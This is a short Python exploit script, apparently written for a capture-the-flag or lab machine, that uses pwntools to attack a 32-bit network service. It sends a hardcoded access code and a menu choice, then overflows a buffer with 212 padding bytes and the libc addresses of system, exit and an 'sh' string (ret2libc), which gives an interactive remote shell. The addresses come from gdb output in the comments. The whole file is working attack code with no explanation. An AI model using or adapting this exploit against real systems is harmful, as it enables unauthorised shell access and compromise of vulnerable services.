#!/usr//bin/python3
from pwn import *

# (gdb) p system 
#$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
#(gdb) p exit
#$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
#(gdb) find &system,+9999999,"sh"
#0xf7f6ddd5
#0xf7f6e7e1
#0xf7f70a14
#0xf7f72582
#warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
#4 patterns found. ###


def bufferOverFlow():

    offset = 212
    junk = b"A"*offset

    system_addr = p32(0xf7e4c060)
    exit_addr = p32(0xf7e3faf0)
    bin_sh_addr = p32(0xf7f6ddd5)

    payload = junk + system_addr + exit_addr + bin_sh_addr

    context(os="linux", arch="i386")
    host, port = "10.10.10.61", 32812
    
    r = remote(host, port)

    r.recvuntil(b"Enter Bridge Access Code:")
    r.sendline(b"picarda1")
    r.recvuntil(b"Waiting for input:")
    r.sendline(b"4")
    r.recvuntil(b"Enter Security Override:")
    r.sendline(payload)
    
    r.interactive()
    

if __name__ == "__main__":
    bufferOverFlow()
